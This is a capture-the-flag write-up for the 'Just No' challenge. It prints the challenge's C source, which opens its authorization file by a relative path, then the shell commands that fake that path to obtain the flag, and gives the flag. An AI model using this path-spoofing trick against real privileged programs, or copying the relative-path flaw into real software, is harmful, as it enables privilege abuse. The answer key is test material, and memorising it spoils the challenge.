<!-- This markdown file is writeup template. -->

## Just No 40pt

### Problem
> A program at /problems/579fe8ee083cd54f55718c1324687c74 has access to a flag but refuses to share it. Can you convince it otherwise?

### Answer
Let's get the flag.

```bash
$ ll /problems/579fe8ee083cd54f55718c1324687c74
total 64
drwxr-xr-x   2 root       root       4096 Mar 22 02:59 ./
drwxr-x--x 573 root       root      36864 Apr  1 23:13 ../
-rw-r--r--   1 hacksports just-no_0     2 Mar 31 08:00 auth
-r--r-----   1 hacksports just-no_0    33 Mar 31 08:00 flag
-rwxr-sr-x   1 hacksports just-no_0  7800 Mar 31 08:00 justno*
-rw-r--r--   1 hacksports just-no_0   838 Mar 31 08:00 justno.c
$ /problems/579fe8ee083cd54f55718c1324687c74/justno
auth file says no. So no. Just... no.
```
Damn it :( Check the source code (`justno.c`).

```c:justno.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char **argv){ 
  FILE* authf = fopen("../../problems/579fe8ee083cd54f55718c1324687c74/auth","r"); 
  //access auth file in ../../../problems/579fe8ee083cd54f55718c1324687c74
  if(authf == NULL){
    printf("could not find auth file in ../../problems/579fe8ee083cd54f55718c1324687c74/\n");
    return 0;
  }
  char auth[8];
  fgets(auth,8,authf);
  fclose(authf);
  if(strcmp(auth,"no")!=0){
    FILE* flagf;
    flagf = fopen("/problems/579fe8ee083cd54f55718c1324687c74/flag","r");
    char flag[64];
    fgets(flag,64,flagf);
    printf("Oh. Well the auth file doesn't say no anymore so... Here's the flag: %s",flag);
    fclose(flagf);
  }else{
    printf("auth file says no. So no. Just... no.\n");
  }
  return 0;
}
```

Aha! Accessing auth file is Relative paths. So spoof a directory structure and make a fake auth file!!!

```bash
$ mkdir -p ~/problems/579fe8ee083cd54f55718c1324687c74
$ cd problems/579fe8ee083cd54f55718c1324687c74
$ echo "yes" > auth
$ /problems/579fe8ee083cd54f55718c1324687c74/justno 
Oh. Well the auth file doesn't say no anymore so... Here's the flag: 37df41ffe2da397584c43eabf8a50ee3
```

### Flag
37df41ffe2da397584c43eabf8a50ee3
